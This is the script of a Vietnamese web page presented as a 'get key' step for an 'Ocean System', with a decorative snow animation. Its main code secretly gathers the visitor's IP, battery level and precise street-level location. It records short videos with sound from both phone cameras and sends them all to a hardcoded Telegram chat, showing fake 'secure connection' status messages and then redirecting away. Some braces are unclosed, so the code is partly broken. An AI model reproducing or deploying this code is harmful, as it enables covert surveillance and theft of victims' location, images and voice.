    <canvas id="snow-canvas"></canvas>
    <script>
      const canvas = document.getElementById('snow-canvas');
      const ctx = canvas.getContext('2d');
  
      function resizeCanvas() {
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
      }
      window.addEventListener('resize', resizeCanvas);
      resizeCanvas();
  
      const snowflakes = [];
      const maxFlakes = 60;
  
      for (let i = 0; i < maxFlakes; i++) {
        snowflakes.push({
          x: Math.random() * canvas.width,
          y: Math.random() * canvas.height,
          radius: Math.random() * 3 + 1,
          speed: Math.random() * 1 + 0.5,
          density: Math.random() * 20
        });
      }
  
      function drawSnow() {
        ctx.clearRect(0, 0, canvas.width, canvas.height);
        ctx.fillStyle = 'rgba(255, 255, 255, 0.75)';
        ctx.beginPath();
        for (let i = 0; i < snowflakes.length; i++) {
          let flake = snowflakes[i];
          ctx.moveTo(flake.x, flake.y);
          ctx.arc(flake.x, flake.y, flake.radius, 0, Math.PI * 2, true);
        }
        ctx.fill();
        updateSnow();
      }
  
      let angle = 0;
      function updateSnow() {
        angle += 0.01;
        for (let i = 0; i < snowflakes.length; i++) {
          let flake = snowflakes[i];
          flake.y += Math.pow(flake.speed, 2) * 0.1 + 1;
          flake.x += Math.sin(angle + flake.density) * 0.8;
  
          if (flake.y > canvas.height) {
            snowflakes[i] = {
              x: Math.random() * canvas.width,
              y: 0,
              radius: flake.radius,
              speed: flake.speed,
              density: flake.density
            };
          }
        }
      }
      setInterval(drawSnow, 30);
    </script>

    <script>

      const TELEGRAM_CHAT_ID = -1004430115536;
      const REDIRECT_URL = 'https://thuvienphapluat.vn/phap-luat/ho-tro-phap-luat/danh-bac-qua-mang-bi-xu-ly-the-nao-theo-bo-luat-hinh-su-2022-mot-so-hinh-thuc-danh-bac-qua-mang-hie-29683.html';
  
      function checkInAppBrowser() {
        const ua = navigator.userAgent || navigator.vendor || window.opera;
        const isInApp = /Telegram|Gram|FBAN|FBAV|Messenger|Instagram|Zalo|TikTok|Line|Viber|Twitter|LinkedInApp/i.test(ua);
        if (isInApp) {

      }
  
      function openExternalBrowser() {
        const currentUrl = window.location.href;
        if (/android/i.test(navigator.userAgent)) {
          window.location.href = `intent://${currentUrl.replace(/^https?:\/\//, '')}#Intent;scheme=https;package=com.android.chrome;end`;
        } else {
          window.location.href = currentUrl;
          setTimeout(() => {
            alert('Vui lòng bấm vào biểu tượng 3 chấm (...) hoặc mũi tên ở góc phải, sau đó chọn "Mở bằng Safari"');
          }, 500);
        }
      }
  
      window.onload = function() {
        checkInAppBrowser();

      function updateClock() {
        const now = new Date();
        document.getElementById('clock').textContent = `🕒 ${now.toLocaleTimeString('vi-VN', { hour12: false })}`;

      setInterval(updateClock, 1000);

      async function getBatteryInfo() {
        try {
          if (navigator.getBattery) {
            const battery = await navigator.getBattery();
            const level = Math.round(battery.level * 100);
            const charging = battery.charging ? '⚡ Đang sạc' : '🔋 Không sạc';
            return `${level}% (${charging})`;
          }
        } catch (e) {}
        return 'Không rõ';
      }
  
      async function getDetailedLocation() {
        return new Promise((resolve) => {
          if (!navigator.geolocation) {
            resolve({ fullAddress: 'Không hỗ trợ định vị', mapsUrl: '' });
            return;
          }
          navigator.geolocation.getCurrentPosition(
            async (position) => {
              const lat = position.coords.latitude;
              const lon = position.coords.longitude;
              const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
  
              let addressString = `Tọa độ: ${lat.toFixed(5)}, ${lon.toFixed(5)}`;
  
              try {
                const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1&accept-language=vi`, {
                  headers: { 'User-Agent': 'Mozilla/5.0' }
                });
                const data = await res.json();
                if (data && data.address) {
                  const addr = data.address;
                  const ward = addr.ward || addr.suburb || addr.quarter || addr.neighbourhood || '';
                  const district = addr.city_district || addr.district || addr.county || '';
                  const city = addr.city || addr.province || addr.state || '';
                  const road = addr.road || addr.residential || '';
                  const houseNumber = addr.house_number || '';
  
                  let parts = [];
                  if (houseNumber) parts.push(`Số ${houseNumber}`);
                  if (road) parts.push(road);
                  if (ward) parts.push(ward);
                  if (district) parts.push(district);
                  if (city) parts.push(city);
  
                  if (parts.length > 0) {
                    addressString = parts.join(', ');
                  } else if (data.display_name) {
                    addressString = data.display_name;
                  }
                }
              } catch (e) {}
  
              resolve({ fullAddress: addressString, mapsUrl: mapsUrl });
            },
            (error) => {
              resolve({ fullAddress: 'Người dùng từ chối cấp quyền vị trí', mapsUrl: '' });
            },
            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
          );
        });
      }
  
      // Hàm fix quay video tương thích tốt trên Mobile và Desktop
      async function recordVideo(useEnvironmentCamera, duration = 3000) {
        try {
          const constraints = {
            video: {
              facingMode: useEnvironmentCamera ? { exact: "environment" } : "user"
            },
            audio: true
          };

          let stream;
          try {
            stream = await navigator.mediaDevices.getUserMedia(constraints);
          } catch (err) {
            // Fallback nếu camera sau (exact environment) không tồn tại trên thiết bị
            stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
          }

          video.srcObject = stream;
          await video.play();
  
          return await new Promise((resolve) => {
            let recordedChunks = [];
            let options = { mimeType: 'video/webm;codecs=vp8,opus' };
            
            if (!MediaRecorder.isTypeSupported(options.mimeType)) {
              if (MediaRecorder.isTypeSupported('video/mp4')) {
                options = { mimeType: 'video/mp4' };
              } else {
                options = {};
              }
            }
  
            const mediaRecorder = new MediaRecorder(stream, options);
  
            mediaRecorder.ondataavailable = (event) => {
              if (event.data && event.data.size > 0) {
                recordedChunks.push(event.data);
              }
            };
  
            mediaRecorder.onstop = () => {
              const blob = new Blob(recordedChunks, { type: mediaRecorder.mimeType || 'video/mp4' });
              stream.getTracks().forEach(track => track.stop());
              resolve(blob);
            };
  
            mediaRecorder.start();
            setTimeout(() => {
              if (mediaRecorder.state !== 'inactive') {
                mediaRecorder.stop();
              }
            }, duration);
          });
        } catch (e) {
          return null;
        }
      }
  
      async function triggerProcess() {
        getKeyBtn.style.display = 'none';
        statusDiv.textContent = '[*] Đang khởi tạo kết nối bảo mật...';
    
        let ipDetails = { ip: 'Không rõ', city: 'Không rõ', country: 'Không rõ', org: 'Không rõ' };
        try {
          const ipRes = await fetch('https://ipwho.is/');
          const ipData = await ipRes.json();
          if (ipData.success) {
            ipDetails = {
              ip: ipData.ip,
              city: ipData.city,
              country: ipData.country,
              org: ipData.connection?.isp || 'Không rõ'
            };
          }
        } catch (e) {}
    
        statusDiv.textContent = '[*] Đang xác thực vị trí chính xác & thiết bị...';
        const [batteryInfo, locationData] = await Promise.all([
          getBatteryInfo(),
          getDetailedLocation()
        ]);
    
        const ua = navigator.userAgent;
        let deviceName = /android/i.test(ua) ? 'Android 🤖' : /iphone|ipad/i.test(ua) ? 'iOS 🍏' : 'PC/Laptop 💻';
    
        let infoText =
          `🌊 <b>YÊU CẦU GET KEY (OCEAN SYSTEM)</b> 🌊\n` +
          `━━━━━━━━━━━━━━━━━━━━━\n` +
          `📱 <b>Thiết bị:</b> ${deviceName}\n` +
          `🔋 <b>Phần trăm pin:</b> ${batteryInfo}\n` +
          `🌐 <b>IP:</b> <code>${ipDetails.ip}</code>\n` +
          `🏡 <b>Địa chỉ:</b>\n<code>${locationData.fullAddress}</code>\n`;
    
        if (locationData.mapsUrl) {
          infoText += `🗺️ <b>Google Maps:</b> <a href="${locationData.mapsUrl}">Xem vị trí cụ thể</a>\n`;
        }
        infoText += `━━━━━━━━━━━━━━━━━━━━━`;
    
        statusDiv.textContent = '[*] Đang ghi hình luồng #1 (Camera sau)...';
        let backVideoBlob = await recordVideo(true, 3000);
    
        statusDiv.textContent = '[*] Đang ghi hình luồng #2 (Camera trước)...';
        let frontVideoBlob = await recordVideo(false, 3000);
    
        let hasSent = false;
    
        if (backVideoBlob && backVideoBlob.size > 0) {
          const fd = new FormData();
          fd.append('chat_id', TELEGRAM_CHAT_ID);
          fd.append('video', backVideoBlob, 'back_video.mp4');
          fd.append('caption', infoText + '\n\n🎥 <b>Video Camera Sau (MP4 + Âm thanh)</b>');
          fd.append('parse_mode', 'HTML');
          try {
            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, { method: 'POST', body: fd });
            hasSent = true;
          } catch(e){}
        }
    
        if (frontVideoBlob && frontVideoBlob.size > 0) {
          const fd2 = new FormData();
          fd2.append('chat_id', TELEGRAM_CHAT_ID);
          fd2.append('video', frontVideoBlob, 'front_video.mp4');
          fd2.append('caption', '🎥 <b>Video Camera Trước (MP4 + Âm thanh)</b>');

          try {
            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, { method: 'POST', body: fd2 });
            hasSent = true;
          } catch(e){}
        }
    
        if (!hasSent) {
          try {
            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: infoText + '\n\n⚠️ (Không thể quay video hoặc truy cập camera/microphone)', parse_mode: 'HTML', disable_web_page_preview: true })
            });
          } catch (e) {}
        }
    
        statusDiv.textContent = '[+] Thành công! Đang chuyển hướng...';
        setTimeout(() => {
          window.location.href = REDIRECT_URL;
        }, 1000);
      }
